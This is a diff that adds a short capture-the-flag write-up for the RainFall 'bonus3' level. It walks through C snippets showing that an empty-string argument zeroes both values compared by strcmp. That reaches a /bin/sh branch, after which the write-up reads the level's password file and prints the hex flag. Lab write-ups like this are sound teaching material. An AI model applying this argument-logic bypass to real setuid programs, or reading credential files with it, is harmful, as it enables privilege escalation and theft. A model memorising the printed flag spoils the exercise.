@@ -1,0 +1,38 @@
+Here we want to run through the shell condition
+
+```c
+if (n == 0) {
+      execl("/bin/sh","sh",0);
+```
+
+So we want n to equal 0.
+Just before, we see :
+
+```c
+n = strcmp(str1,argv[1]);
+```
+
+So we want str1 to equal argv[1].
+A bit earlier we see:
+
+```c
+n = atoi(argv[1]);
+// ...
+str1[n] = '\0';
+```
+
+An easy way is to just enter an empty string in argv[1], so that atoi(argv[1]) returns 0 (and so n equal 0) and str1[0] = '\0' so str1 is also an empty string.
+In the end, both str1 and argv[1] are empty strings, so strcmp(str1,argv[1]) == 0 so we go through the shell condition.
+
+Once we entered the shell, we can guess where the pass is with this line
+
+```c
+fd = fopen("/home/user/end/.pass","r");
+```
+
+The exploit:
+```sh
+bonus3@RainFall:~$ ./bonus3 "" 
+$ cat /home/user/end/.pass
+3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
+```
